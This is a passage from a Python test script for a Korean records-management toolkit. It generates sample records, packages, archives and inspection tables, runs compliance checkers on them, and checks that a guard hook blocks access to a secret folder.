        txt = " | ".join(f"{a_}:{b_}:{c_}" for a_, b_, c_ in dk)
        ok_dk = (cdk == 1 and "공문.txt:날짜:2026. 11. 20." in txt and "공문.txt:시간:14:30" in txt and "금일십일만삼천오백육십원" in txt
                 and "금육만삼천오백육십원" in txt and "공문.txt:항목 순서:1. 단계 2 다음은 3번째" in txt and "가. 단계 2 다음은 3번째" in txt
                 and "1) 다음 하위 항목은 가)" in txt and "공문.txt:붙임" in txt and "끝." in txt and not any(f_ == "공문2.txt" for f_, _, _ in dk))
    check("공문서 표기: 날짜·시간·금액(한글 대조), 항목 순서·단계, 붙임 구분·수량, 끝 표시 — 바른 문서는 제안 0", ok_dk, odk + txt[:300] if os.path.exists(f"{t}/산출/공문점검.xlsx") else odk)

    # 시스템 기능요건(NAK 6·7·20·19) 점검표와 결과 집계
    crq, orq = run([S("system-requirements", "scripts", "req_checklist.py"), "--system", "기록관리시스템", "-o", f"{t}/산출/요건.xlsx"])
    ok_rq = False
    if crq == 0:
        wq = openpyxl.load_workbook(f"{t}/산출/요건.xlsx")
        rq = [list(r) for r in wq["점검표"].iter_rows(min_row=2, values_only=True)]
        for i, r in enumerate(rq):
            r[6] = "충족" if i % 10 else "미충족"
        xlsx(f"{t}/요건결과.xlsx", [["표준", "번호", "장", "절", "요건", "구분", "이행", "근거"]] + rq)
        crq2, orq2 = run([S("system-requirements", "scripts", "req_checklist.py"), "--system", "기록관리시스템", "--results", f"{t}/요건결과.xlsx",
                          "-o", f"{t}/산출/요건결과.xlsx"])
        wq2 = openpyxl.load_workbook(f"{t}/산출/요건결과.xlsx")
        nm = sum(1 for i, r in enumerate(rq) if i % 10 == 0 and r[5] in ("M", "CM"))
        miss_ = [r for r in wq2["필수 미충족"].iter_rows(min_row=2, values_only=True)]
        ok_rq = (len(rq) == 161 and rq[0][1] == "5.1.1" and crq2 == 0 and len(miss_) == nm and nm > 0 and "필수요건 충족" in str([r[0] for r in wq2["요약"].iter_rows(values_only=True)]))
        orq += orq2
    check("시스템 기능요건 NAK 6: 점검표 161개(M·O), 채운 결과로 필수 미충족 목록·충족률", ok_rq, orq)
    # PDF/A-1b 사전 점검(NAK 30)
    import pikepdf as _pk
    os.makedirs(f"{t}/pdfa30", exist_ok=True)
    _p = _pk.new(); _p.add_blank_page()
    _p.Root.Names = _p.make_indirect(_pk.Dictionary(EmbeddedFiles=_pk.Dictionary(Names=_pk.Array())))
    _p.Root.OpenAction = _pk.Dictionary(S=_pk.Name.JavaScript, JS=_pk.String("x"))
    _p.save(f"{t}/pdfa30/bad.pdf")
    _p.save(f"{t}/pdfa30/enc.pdf", encryption=_pk.Encryption(owner="o", user="u"))
    cpa, opa = run([S("preservation-convert", "scripts", "pdfa_precheck.py"), f"{t}/pdfa30", "-o", f"{t}/산출/pdfa30.csv"])
    pa = {r[0]: r for r in list(csv.reader(open(f"{t}/산출/pdfa30.csv", encoding="utf-8-sig")))[1:]} if os.path.exists(f"{t}/산출/pdfa30.csv") else {}
    check("PDF/A 사전 점검 NAK 30: 선언·OutputIntent·내장 파일·JavaScript·암호화",
          cpa == 1 and all(k in pa.get("bad.pdf", [""] * 4)[3] for k in ("6.7", "6.2.2", "6.1.11", "6.6")) and "Encrypt" in pa.get("enc.pdf", [""] * 4)[3], opa)

    # NEO2 장기보존패키지 구조(NAK 31-1)
    import base64 as _b64
    os.makedirs(f"{t}/neo")
    body = _b64.b64encode(b"hello").decode()
    good = ('<neo:NAKEncapsulatedObject xmlns:neo="urn:nak:neo"><neo:NEOFormatDescription>NEO</neo:NEOFormatDescription><neo:Version>2.0</neo:Version>'
            '<neo:SignedObject><neo:ObjectCreationDate>2026-11-20</neo:ObjectCreationDate><neo:ObjectContent><neo:Record><neo:RecordMetadata>'
            '<neo:TitleCon><neo:MainTitle>가상</neo:MainTitle></neo:TitleCon><neo:DateTimeCon><neo:DateTimeCreated>2026</neo:DateTimeCreated>'
            '<neo:DateTimeClosed>2026</neo:DateTimeClosed></neo:DateTimeCon></neo:RecordMetadata><neo:Component><neo:ComponentMetadata>'
            '<neo:ComponentTitle>본문</neo:ComponentTitle><neo:ComponentType>본문</neo:ComponentType></neo:ComponentMetadata><neo:Encoding>'
            '<neo:EncodingMetadata><neo:SourceFileIdentifier>a.txt</neo:SourceFileIdentifier><neo:SouceFileFormatName>TXT</neo:SouceFileFormatName>'
            '<neo:SourceFileExtent>5</neo:SourceFileExtent></neo:EncodingMetadata><neo:ComponentData>' + body + '</neo:ComponentData></neo:Encoding>'
            '</neo:Component></neo:Record></neo:ObjectContent></neo:SignedObject><neo:SignatureBlock><neo:SignatureFormatDescription>x</neo:SignatureFormatDescription>'
            '<neo:SignatureDate>2026</neo:SignatureDate><neo:Signer>x</neo:Signer><neo:Signature>x</neo:Signature></neo:SignatureBlock></neo:NAKEncapsulatedObject>')
    open(f"{t}/neo/good.xml", "w", encoding="utf-8").write(good)
    open(f"{t}/neo/bad.xml", "w", encoding="utf-8").write(good.replace("<neo:MainTitle>가상</neo:MainTitle>", "").replace(body, "@@@").replace(
        "<neo:SignatureBlock>", "<neo:X>").replace("</neo:SignatureBlock>", "</neo:X>"))
    cnc, onc = run([S("transfer-reconcile", "scripts", "neo_check.py"), f"{t}/neo", "-o", f"{t}/산출/neo.csv"])
    nc = {r[0]: r for r in list(csv.reader(open(f"{t}/산출/neo.csv", encoding="utf-8-sig")))[1:]} if os.path.exists(f"{t}/산출/neo.csv") else {}
    check("NEO2 NAK 31-1: 필수 요소·부모별 필수, Base64·크기, 서명 블록", cnc == 1 and nc.get("good.xml", [""])[-1] == "통과"
          and all(k in nc.get("bad.xml", [""] * 6)[4] for k in ("TitleCon→MainTitle", "Base64", "SignatureBlock")), onc + str(nc.get("bad.xml")))
    import hashlib as _hl
    import zipfile as _zf
    rec = b"record-body"
    pi = ('<PackagingInformation xmlns="http://www.archives.go.kr/2020/RMS/3.0"><Version>3.0</Version><PackageManifest>'
          '<ManifestItem HashAlgorithm="SHA2-256"><HashValue>' + _hl.sha256(rec).hexdigest() + '</HashValue><Path>Record/a.pdf</Path></ManifestItem>'
          '</PackageManifest></PackagingInformation>')
    def _mk(name, first="mimetype", mt="application/neo3+zip", body=rec):
        with _zf.ZipFile(f"{t}/{name}", "w", _zf.ZIP_DEFLATED) as z:
            if first == "mimetype":
                z.writestr(_zf.ZipInfo("mimetype"), mt, compress_type=_zf.ZIP_STORED)
            for n_ in ("Metadata.xml", "Metadata.xsd", "PackagingInformation.xsd"):
                z.writestr(n_, "<x/>")
            z.writestr("PackagingInformation.xml", pi)
            z.writestr("Record/a.pdf", body)
            if first != "mimetype":
                z.writestr("mimetype", mt)
    _mk("neo3ok.zip")
    _mk("neo3bad.zip", first="late", body=b"tampered")
    c3, o3 = run([S("transfer-reconcile", "scripts", "neo_check.py"), f"{t}/neo3ok.zip", "-o", f"{t}/산출/neo3ok.csv"])
    c3b, o3b = run([S("transfer-reconcile", "scripts", "neo_check.py"), f"{t}/neo3bad.zip", "-o", f"{t}/산출/neo3bad.csv"])
    bad3 = " ".join(r[1] for r in list(csv.reader(open(f"{t}/산출/neo3bad.csv", encoding="utf-8-sig")))[1:]) if os.path.exists(f"{t}/산출/neo3bad.csv") else ""
    check("NEO3 NAK 31-2: mimetype 첫 항목·비압축, 최상위 4파일, Manifest 해시 대조", c3 == 0 and c3b == 1
          and "첫 항목" in bad3 and "압축돼" in bad3 and "해시 불일치" in bad3, o3 + o3b + bad3)

    # NAK 8 메타데이터 필수 요소
    hdr = ["1.1 생산자유형", "1.2 기관명", "1.6 개인명", "2 기록계층", "3.1 기본식별자", "4.1 제목", "7 전자기록물여부", "8.1 기록유형", "9.1 포맷명",
           "11.1 용량", "11.2 단위", "12.1 분류체계유형", "12.2.2 분류명", "13.1 생산일시", "13.2 종료일시", "15.1 보존기간", "16 보존장소",
           "17.3.1 공개구분", "17.3.2 비공개사유", "5.2 기술내용"]
    good_r = ["기안자", "가상기관", "홍길동", "건", "A-1", "가상 보고", "Y", "일반문서", "PDF", "10", "KB", "기록관리기준표", "가상과제",
              "2026-01-02", "2026-01-02", "10년", "기록관", "공개", "", ""]
    bad_r = list(good_r)
    bad_r[0], bad_r[2], bad_r[3], bad_r[4], bad_r[8], bad_r[14], bad_r[17], bad_r[19] = "결재자", "", "", "A-2", "", "2025-12-31", "비공개", "요약"
    with open(f"{t}/nak8.csv", "w", encoding="utf-8-sig", newline="") as f:
        csv.writer(f).writerows([hdr, good_r, bad_r])
    old_r = list(good_r); old_r[5] = "옛 제목"
    with open(f"{t}/nak8_old.csv", "w", encoding="utf-8-sig", newline="") as f:
        csv.writer(f).writerows([hdr, old_r])
    c8, o8 = run([S("metadata-autofill", "scripts", "nak8_check.py"), f"{t}/nak8.csv", "--before", f"{t}/nak8_old.csv", "-o", f"{t}/산출/nak8.csv"])
    r8 = {r[1]: r for r in list(csv.reader(open(f"{t}/산출/nak8.csv", encoding="utf-8-sig")))[1:]} if os.path.exists(f"{t}/산출/nak8.csv") else {}
    b8, g8 = r8.get("A-2", [""] * 5)[3], r8.get("A-1", [""] * 5)[3]
    check("메타데이터 NAK 8: 필수·세트·비공개사유·부속서 D 개인명·종료<생산·포맷·변경 불가", c8 == 1
          and all(k in b8 for k in ("기록계층", "기술유형", "비공개사유", "개인명", "종료일시", "포맷명")) and "변경 불가" in g8, o8 + b8 + g8)

    # SIARD 2.1(NAK 35 부속서 B)
    meta = ('<siardArchive xmlns="http://www.bar.admin.ch/xmlns/siard/2/metadata.xsd"><schemas><schema><name>S</name><folder>schema0</folder>'
            '<tables><table><name>T</name><folder>table0</folder><columns><column><name>A</name></column><column><name>B</name></column></columns>'
            '</table></tables></schema></schemas></siardArchive>')
    xsd = ('<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:element name="table"><xs:complexType><xs:sequence>'
           '<xs:element name="row"><xs:complexType><xs:sequence><xs:element name="c1"/><xs:element name="c2"/></xs:sequence></xs:complexType></xs:element>'
           '</xs:sequence></xs:complexType></xs:element></xs:schema>')
    def _sd(name, ok=True):
        with _zf.ZipFile(f"{t}/{name}", "w", _zf.ZIP_DEFLATED) as z:
            if ok:
                z.writestr("header/siardversion/2.1/", "")
            z.writestr("header/metadata.xml", meta)
            z.writestr("header/metadata.xsd", "<x/>")
            z.writestr("content/schema0/table0/table0.xml", "<table/>")
            z.writestr("content/schema0/table0/table0.xsd", xsd if ok else xsd.replace('<xs:element name="c2"/>', ""))
            if not ok:
                z.writestr("extra.txt", "x")
                z.writestr("content/schema0/1표/1표.xml", "x")
    _sd("ok.siard"); _sd("bad.siard", ok=False)
    cs, os_ = run([S("dataset-schedule", "scripts", "siard_check.py"), f"{t}/ok.siard", "-o", f"{t}/산출/siard_ok.csv"])
    cb, ob = run([S("dataset-schedule", "scripts", "siard_check.py"), f"{t}/bad.siard", "-o", f"{t}/산출/siard_bad.csv"])
    sb = " ".join(r[0] for r in list(csv.reader(open(f"{t}/산출/siard_bad.csv", encoding="utf-8-sig")))[1:]) if os.path.exists(f"{t}/산출/siard_bad.csv") else ""
    check("SIARD NAK 35 부속서 B: 최상위 폴더·버전 폴더·이름 규칙·metadata 대응·열 수", cs == 0 and cb == 1
          and all(k in sb for k in ("P_4.2-1", "P_4.2-4", "P_4.2-6", "P_4.3-1", "P_4.3-2")), os_ + ob + sb)

    # 기록재료(시행규칙 별표 15)
    xlsx(f"{t}/재료.xlsx", [["철분류번호", "제목", "보존기간", "용지", "필기구", "용기", "용지pH", "탄산칼슘", "내광성"],
                          ["M-1", "가상 대장", "영구", "보존복사용지", "레이저 토너", "보존용 판지 상자", "8.1", "2.5", "5"],
                          ["M-2", "가상 도면", "준영구", "재생지", "수성 볼펜", "일반 서류봉투", "6.2", "1", "3"],
                          ["M-3", "가상 메모", "5년", "재생지", "볼펜", "", "", "", ""],
                          ["M-4", "가상 서명부", "30년", "한지", "탄소형 사인펜", "", "", "", ""]])
    cm, om = run([S("preservation-inspection", "scripts", "materials_check.py"), f"{t}/재료.xlsx", "-o", f"{t}/산출/재료.xlsx"])
    mr = [r for r in openpyxl.load_workbook(f"{t}/산출/재료.xlsx")["점검 결과"].iter_rows(min_row=2, values_only=True)] if os.path.exists(f"{t}/산출/재료.xlsx") else []
    m2 = " ".join(r[5] for r in mr if r[1] == "M-2")
    xlsx(f"{t}/재료2.xlsx", [["철분류번호", "제목", "보존기간", "용지", "필기구", "용도", "평량", "백색도", "용지pH", "탄산칼슘", "Kappa", "인열강도", "인장강도", "변색도", "인열강도유지율"],
                           ["I-1", "협약서", "영구", "보존백상지", "토너", "협약류", "90", "82", "8.2", "3.2", "3", "900", "", "2.1", "90"],
                           ["I-2", "서한", "영구", "보존백상지", "토너", "공식서한류", "150", "85", "10.5", "3.5", "4", "1100", "120", "4", "92"]])
    ci2, oi2 = run([S("preservation-inspection", "scripts", "materials_check.py"), f"{t}/재료2.xlsx", "--important", "-o", f"{t}/산출/재료2.xlsx"])
    mi = {}
    for r_ in openpyxl.load_workbook(f"{t}/산출/재료2.xlsx")["점검 결과"].iter_rows(min_row=2, values_only=True):
        mi.setdefault(r_[1], []).append(r_[5])
    i1, i2 = " ".join(mi.get("I-1", [])), " ".join(mi.get("I-2", []))
    check("기록용지 중요문서용 규격(안) --important: 협약류 인열 1,200·평량 환산·pH 상한 10·ΔE 3.5", ci2 == 1
          and "협약류 1200" in i1 and "pH 7.5~10.0 밖" in i2 and "ΔE" in i2 and "초과(4)" in i2 and "인장강도" in i2, oi2 + str(mi))
    xlsx(f"{t}/생물.xlsx", [["구분", "대상", "측정일", "RLU", "부유세균", "부유곰팡이", "재질", "곰팡이육안"],
                          ["기록물", "B-1", "2026-10-01", "1500", "", "", "백상지", ""], ["기록물", "B-2", "2026-10-01", "400", "", "", "박엽지", ""],
                          ["기록물", "B-3", "2026-10-01", "200", "", "", "갱지", "Y"], ["기록물", "B-4", "2026-10-01", "100", "", "", "백상지", ""],
                          ["서고", "1서고", "2026-03-01", "", "100", "5", "", ""], ["서고", "1서고", "2026-10-01", "", "900", "20", "", ""],
                          ["서고", "2서고", "2025-06-01", "", "50", "600", "", ""]])
    cbio, obio = run([S("preservation-inspection", "scripts", "bio_check.py"), f"{t}/생물.xlsx", "--today", "2026-11-20", "-o", f"{t}/산출/생물.xlsx"])
    bio = {}
    for r_ in openpyxl.load_workbook(f"{t}/산출/생물.xlsx")["점검 결과"].iter_rows(min_row=2, values_only=True):
        bio.setdefault((r_[2], r_[3]), []).append(r_[5])
    bj = lambda k: " ".join(bio.get(k, []))
    check("생물오염: ATP 1,000 RLU·박엽지 보완·육안 곰팡이·부유세균 800·곰팡이 500·3배 증가·1년 지남(미소독기록물 연구)", cbio == 1
          and "1000" in bj(("B-1", "2026-10-01")) and "박엽지" in bj(("B-2", "2026-10-01")) and "육안" in bj(("B-3", "2026-10-01"))
          and ("B-4", "2026-10-01") not in bio and "부유세균" in bj(("1서고", "2026-10-01")) and "3배" in bj(("1서고", "2026-10-01"))
          and "부유곰팡이 600" in bj(("2서고", "2025-06-01")) and "1년 지남" in bj(("2서고", "2025-06-01")), obio + str(bio))
    xlsx(f"{t}/트랩.xlsx", [["서고", "수거일", "트랩", "해충", "개체수"], ["1서고", "2026-09-01", "페로몬", "권연벌레", "2"], ["1서고", "2026-10-01", "페로몬", "권연벌레", "1"],
                           ["2서고", "2026-10-01", "점착", "바퀴", "1"], ["3서고", "2026-10-01", "점착", "좀", "1"]])
    ctr, otr = run([S("preservation-inspection", "scripts", "bio_check.py"), f"{t}/생물.xlsx", "--traps", f"{t}/트랩.xlsx", "--today", "2026-11-20", "-o", f"{t}/산출/생물2.xlsx"])
    trp = [r for r in openpyxl.load_workbook(f"{t}/산출/생물2.xlsx")["해충 트랩"].iter_rows(min_row=2, values_only=True)]
    check("해충 트랩(기록물 소독대상 선별 및 처리 매뉴얼 2022): 1등급 재포획 → 서고 전량 저산소 소독, 2등급 오염 해충",
          "전량 저산소" in str(trp[1][7]) and "다시 잡히면" in str(trp[0][7]) and trp[2][6].startswith("2등급") and trp[3][6].startswith("1등급"), otr + str(trp))
    check("기록재료 별표 15: 용지·필기구·용기·pH 7.5·탄산칼슘 2%·내광성 4호, 30년 미만 제외", cm == 1
          and not any(r[1] in ("M-1", "M-3", "M-4") for r in mr) and all(k in m2 for k in ("재생지", "수성", "pH 6.2", "탄산칼슘 1", "내광성 3", "용기") if k != "용기")
          and any(r[1] == "M-2" and r[4] == "용기" for r in mr), om + str(mr))

    # 광디스크 오류율(국가기록원 매체 기준 연구: ISO/IEC 29121·JIIMA BD·DA/T 38)
    xlsx(f"{t}/디스크.xlsx", [["매체번호", "종류", "검사구분", "측정일", "PI sum 8", "R-SER", "Burst", "BLER", "수정불가"],
                            ["D1", "DVD-R", "초기", "2026-01-10", "120", "", "", "", ""], ["D2", "DVD-R", "정기", "2023-01-10", "90", "", "", "", ""],
                            ["D3", "DVD-R", "정기", "2026-05-01", "300", "", "", "", ""], ["B1", "BD-R", "정기", "2026-05-01", "", "7E-4", "500", "", ""],
                            ["C1", "CD-R", "정기", "2026-05-01", "", "", "", "230", ""], ["D4", "DVD-R", "정기", "2026-05-01", "50", "", "", "", "1"]])
    cdk, odk = run([S("media-check", "scripts", "disc_errors.py"), f"{t}/디스크.xlsx", "--today", "2026-11-20", "-o", f"{t}/산출/디스크.xlsx"])
    dk = {r[1]: r for r in openpyxl.load_workbook(f"{t}/산출/디스크.xlsx")["판정"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/디스크.xlsx") else {}
    cdc, _ = run([S("media-check", "scripts", "disc_errors.py"), f"{t}/디스크.xlsx", "--standard", "china", "--today", "2026-11-20", "-o", f"{t}/산출/디스크중국.xlsx"])
    dkc = {r[1]: r for r in openpyxl.load_workbook(f"{t}/산출/디스크중국.xlsx")["판정"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/디스크중국.xlsx") else {}
    check("광디스크 오류율: DVD 초기 100·정기 140/280(ISO 29121), 3년 주기 지남, BD R-SER, CD BLER 220, 수정불가 즉시, 중국 기준 초기 80",
          cdk == 1 and dk["D1"][6] == 2 and dk["D2"][6] == 1 and "지남" in str(dk["D2"][9]) and dk["D3"][6] == 3 and dk["B1"][6] == 2
          and dk["C1"][6] == 3 and dk["D4"][6] == 3 and dkc["D1"][6] == 2 and dkc["D2"][6] == 1, odk + str(dk))

    # 플러그인 훅 명령: Windows(Git Bash)처럼 python3가 없거나 가짜일 때도 보호가 꺼지지 않는지
    hj = os.path.join(ROOT, "hooks", "hooks.json")
    bash = shutil.which("bash")
    if os.path.exists(hj) and bash and os.name != "nt":
        hk = json.load(open(hj, encoding="utf-8"))["hooks"]
        guard, logc = hk["PreToolUse"][0]["hooks"][0]["command"], hk["PostToolUse"][0]["hooks"][0]["command"]
        sec = json.dumps({"tool_name": "Read", "tool_input": {"file_path": f"{t}/비밀/목록.xlsx"}, "cwd": t})
        pub = json.dumps({"tool_name": "Read", "tool_input": {"file_path": f"{t}/공개/목록.xlsx"}, "cwd": t})
        real = os.path.realpath(sys.executable)
        envs = {}
        for name_, files in (("store", {"python3": None, "python": real}), ("py", {"py": real}), ("none", {})):
            d = os.path.join(t, "fakebin_" + name_)
            os.makedirs(d, exist_ok=True)
            for fn, target in files.items():
                p_ = os.path.join(d, fn)
                if target:
                    os.symlink(target, p_)
                else:
                    with open(p_, "w") as fh:
                        fh.write("#!/bin/sh\necho 'Python was not found' >&2\nexit 9\n")
                    os.chmod(p_, 0o755)
            envs[name_] = dict(os.environ, PATH=d, CLAUDE_PLUGIN_ROOT=ROOT)
        hr = lambda cmd, inp, env: subprocess.run([bash, "-c", cmd], input=inp, text=True, capture_output=True, env=env, cwd=t).returncode
        got = {k: (hr(guard, sec, e), hr(guard, pub, e)) for k, e in envs.items() if k != "none"}
        none_guard, none_log = hr(guard, pub, envs["none"]), hr(logc, pub, envs["none"])
        check("훅 명령: python3 가짜(Store)·py만 있어도 비밀 차단(2)·공개 통과(0), Python 없으면 보호 훅은 막고 기록 훅은 통과",
              got == {"store": (2, 0), "py": (2, 0)} and none_guard == 2 and none_log == 0, str(got) + f" none={none_guard},{none_log}")

    ok = sum(r[1] for r in results)
    for name, passed, detail in results:
        print(f"{'통과' if passed else '실패'}  {name}" + ("" if passed else f"  — {detail}"))
    print(f"\n{ok}/{len(results)} 통과 (시험 폴더: {t})")
    return 0 if ok == len(results) else 1


if __name__ == "__main__":
    sys.exit(main())
